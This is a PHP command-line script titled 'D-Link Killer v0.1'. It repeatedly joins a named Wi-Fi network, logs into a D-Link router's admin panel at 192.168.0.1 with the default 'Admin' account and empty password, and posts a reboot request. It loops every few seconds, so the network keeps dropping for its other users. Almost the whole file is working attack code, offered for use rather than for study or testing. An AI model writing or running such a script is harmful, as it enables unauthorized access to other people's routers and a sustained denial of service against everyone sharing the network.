<?php

date_default_timezone_set('Asia/Jakarta');
cli_set_process_title("D-Link Killer v0.1");

echo "D-Link Killer v0.1\nby willhendyan (github.com/willhendyan)\n\n";

function checkPing(){
    return exec("ping -n 1 google.com");
}

function getStr($start, $end, $string) {
    if (!empty($string)) {
    $setring = explode($start,$string);
    $setring = explode($end,$setring[1]);
    return $setring[0];
    }
}

$wifiName = 'Pantat Network';
$username = 'Admin';
$password = '';
$userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134';
$cookie = dirname(__FILE__)."/cookie.txt";


echo date("[h:i:s A]") . " => Starting engine...\n";
while(1){
$check = checkPing();
    if(strpos($check, "could not find host")){
        echo date("[h:i:s A]") . " => Wi-Fi are not connected or disconnected!\n";
            echo date("[h:i:s A]") . " => Connecting to $wifiName...\n";
        $result = exec('netsh wlan connect ssid="' . $wifiName . '" name="' . $wifiName . '"');
        if(strpos($result, "Connection request was completed successfully.")){
            echo date("[h:i:s A]") . " => Connected to $wifiName\n";
        }
    }else if(strpos($check, "Average = ")){
        $ms = getStr("Average = ", "ms", $check);
        echo date("[h:i:s A]") . " => You're connected. Reply from google.com: time=$ms" . "ms\n";

        echo date("[h:i:s A]") . " => Trying to login admin panel...\n";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://192.168.0.1/login.cgi");
        curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
        curl_setopt($ch, CURLOPT_COOKIEJAR,  $cookie);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "username=Admin&password=&submit.htm%3Flogin.htm=Send");
        curl_setopt($ch, CURLOPT_POST, 1);
        $result = curl_exec($ch);

        if(strpos($result, "Username or password error, try again")){
            echo date("[h:i:s A]") . " => Wrong password!\n";
        }else if(strpos($result, "window.location.href='index.htm")){
            echo date("[h:i:s A]") . " => Login success!\n";
            echo date("[h:i:s A]") . " => Killing system!\n";
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "http://192.168.0.1/form2Reboot.cgi");
            curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
            curl_setopt($ch, CURLOPT_COOKIEJAR,  $cookie);
            curl_setopt($ch, CURLOPT_POSTFIELDS, "reboot=Reboot&submit.htm%3Freboot.htm=Send");
            curl_setopt($ch, CURLOPT_POST, 1);
            $result = curl_exec($ch);

            if(strpos($result, "System is rebooting now")){
                echo date("[h:i:s A]") . " => System is killed!\n";
                for ($i=0; $i < 30 ; $i++) { 
                    $count = 30-$i;
                    echo date("[h:i:s A]") . " => Please wait for $count" . "s...\n";
                    sleep(1);
                }
            }else{
                echo date("[h:i:s A]") . " => Fail to kill!\n";
            }
        }

    }
sleep(1);
}
?>